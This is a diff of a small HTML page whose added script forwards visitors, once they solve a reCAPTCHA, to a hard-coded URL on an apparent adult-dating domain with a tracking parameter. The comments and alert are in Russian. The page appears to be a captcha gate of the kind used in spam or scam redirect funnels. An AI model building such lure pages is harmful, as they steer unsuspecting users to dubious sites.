@@ -1,4 +1,4 @@
-
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -72,4 +72,19 @@
 
     <script>
         const form = document.getElementById('captchaForm');
-        const redire
+        const redirectUrl = "https://mb9pmr0.meethot-love.com/lwyrlwm?t=kapchTT"; // Убедитесь, что ссылка правильная
+
+        form.addEventListener('submit', (event) => {
+            event.preventDefault();
+            const response = grecaptcha.getResponse();
+
+            if (response.length === 0) {
+                alert("Пожалуйста, решите капчу!");
+            } else {
+                // Перенаправление после успешного решения капчи
+                window.location.href = redirectUrl;
+            }
+        });
+    </script>
+</body>
+</html>
